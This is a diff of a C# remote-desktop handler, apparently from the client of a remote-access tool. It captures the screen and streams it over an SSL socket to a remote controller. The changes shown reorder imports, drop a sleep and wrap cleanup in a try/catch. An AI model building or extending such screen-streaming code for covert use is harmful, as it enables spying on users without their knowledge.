@@ -1,21 +1,20 @@
-﻿using Client.MessagePack;
-using Client.Sockets;
-using System.Drawing;
-using System.Drawing.Imaging;
+﻿using System;
 using System.IO;
-using System.Windows.Forms;
-using Client.Helper;
-using System;
-using Client.StreamLibrary.UnsafeCodecs;
-using Client.StreamLibrary;
-using System.Runtime.InteropServices;
 using System.Threading;
+using System.Drawing.Imaging;
+using System.Drawing;
+using System.Windows.Forms;
+using System.Runtime.InteropServices;
+using Client.MessagePack;
+using Client.Connection;
+using Client.StreamLibrary.UnsafeCodecs;
+using Client.Helper;
+using Client.StreamLibrary;
 
 namespace Client.Handle_Packet
 {
     public class HandleRemoteDesktop
     {
-
         public HandleRemoteDesktop(MsgPack unpack_msgpack)
         {
             try
@@ -80,7 +79,6 @@ namespace Client.Handle_Packet
                             tempSocket.SslClient.Write(BitConverter.GetBytes(msgpack.Encode2Bytes().Length));
                             tempSocket.SslClient.Write(msgpack.Encode2Bytes());
                             tempSocket.SslClient.Flush();
-                            Thread.Sleep(1);
                         }
                     }
                     bmp.UnlockBits(bmpData);
@@ -88,9 +86,13 @@ namespace Client.Handle_Packet
                 }
                 catch { break; }
             }
-            bmp?.UnlockBits(bmpData);
-            bmp?.Dispose();
-            tempSocket?.Dispose();
+            try
+            {
+                bmp?.UnlockBits(bmpData);
+                bmp?.Dispose();
+                tempSocket?.Dispose();
+            }
+            catch { }
         }
 
         private Bitmap GetScreen(int Scrn)
